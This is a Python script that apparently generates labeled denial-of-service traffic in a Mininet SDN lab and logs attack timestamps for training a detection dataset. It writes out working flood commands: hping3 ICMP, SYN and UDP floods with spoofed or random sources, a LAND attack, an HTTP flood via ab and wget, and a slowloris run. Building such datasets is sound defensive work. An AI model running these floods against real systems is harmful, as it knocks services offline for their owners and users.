"""run_attack.py - Generate labeled attack traffic and log timestamps.

Usage
-----
    sudo python3 run_attack.py

Run OUTSIDE Mininet on h3 (the attacker host) via xterm or directly.
Writes run_attack_log.json with exact unix timestamps for label_dataset.py.

IMPORTANT: NORMAL_COLLECTION_MODE = False, ATTACK_COLLECTION_MODE = True in monitor.py
"""

import os
import subprocess
import time
import json

DEFAULT_DURATION = 140  # seconds per attack
PAUSE            = 50   # seconds to wait between attacks for flow stats to stabilize
LOG_PATH         = '../ryu-controller/run_attack_log.json'

# =========================
# EXTERNAL (run on h_ext)
# =========================
EXTERNAL_ATTACKS = [
    {
        'name': 'ICMP_flood',
        'cmds': [
            'hping3 --icmp --flood --rand-source 192.168.10.10',
        ],
    },
    {
        'name': 'SYN_flood',
        'cmds': [
            'hping3 -S --flood --rand-source -p 80 192.168.10.10',
        ],
    },
    {
        'name': 'UDP_flood',
        'cmds': [
            'hping3 --udp --flood --rand-source -p 80 192.168.10.10',
        ],
    },
    {
        'name': 'HTTP_flood',
        'cmds': [
            'ab -n 999999 -c 200 http://192.168.10.10/ || '
            'while true; do wget -q -O /dev/null http://192.168.10.10; done',
        ],
    },
    {
        'name': 'LAND_attack',
        'cmds': [
            'hping3 -S --flood --spoof 192.168.10.10 192.168.10.10 -p 80',
        ],
    },
]

# =========================
# INTERNAL (run on h3)
# =========================
INTERNAL_ATTACKS = [
    {
        'name': 'SLOWLORIS',
        'cmds': ['python3 ../services/attacks/slowloris.py'],
        'duration': 400,
    },
    {
        'name': 'UDP_flood',
        'cmds': [
            'hping3 --udp --flood --spoof 192.168.20.101 -p 53 192.168.20.12',
            'hping3 --udp --flood --spoof 192.168.20.102 -p 53 192.168.20.12',
            'hping3 --udp --flood --spoof 192.168.20.103 -p 53 192.168.20.12',
        ],
    },
]

def determine_attack_suite():
    try:
        # hot IP from the system
        result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
        ips = result.stdout.strip().split()
        
        for ip in ips:
            if ip.startswith('10.'):
                print(f"[+] Detected external IP ({ip}). Loading EXTERNAL_ATTACKS.")
                return EXTERNAL_ATTACKS
            elif ip.startswith('192.168.20.'):
                print(f"[+] Detected internal IP ({ip}). Loading INTERNAL_ATTACKS.")
                return INTERNAL_ATTACKS
    except Exception as e:
        print(f"[-] Could not read IPs automatically: {e}")

    # fallback to asking the user
    while True:
        choice = input("[?] Run (E)xternal or (I)nternal attacks? [e/i]: ").strip().lower()
        if choice.startswith('e'):
            return EXTERNAL_ATTACKS
        elif choice.startswith('i'):
            return INTERNAL_ATTACKS
        print("Please enter 'e' or 'i'.")

# Automatically determine the attack suite based on the node's IP
ATTACKS = determine_attack_suite()

os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)

if os.path.exists(LOG_PATH):
    with open(LOG_PATH, 'r') as f:
        log = json.load(f)
else:
    log = []

for attack in ATTACKS:
    duration = attack.get('duration', DEFAULT_DURATION)
    print(f'\n[+] Starting {attack["name"]} (duration={duration}s)...')
    start = time.time()

    procs = []
    for cmd in attack['cmds']:
        p = subprocess.Popen(
            cmd, shell=True,
            # stdout=subprocess.DEVNULL,
            # stderr=subprocess.DEVNULL
        )
        procs.append(p)

    time.sleep(duration)

    for p in procs:
        p.terminate()
        p.wait()

    end = time.time()
    log.append({
        'attack_type': attack['name'],
        'start': start,
        'end': end
    })

    print(f'    start : {start:.2f}')
    print(f'    end   : {end:.2f}')
    print(f'[+] {attack["name"]} done. Pausing {PAUSE}s...')
    time.sleep(PAUSE)

# save log
with open(LOG_PATH, 'w') as f:
    json.dump(log, f, indent=2)

print(f'\nAttack log saved to {LOG_PATH}')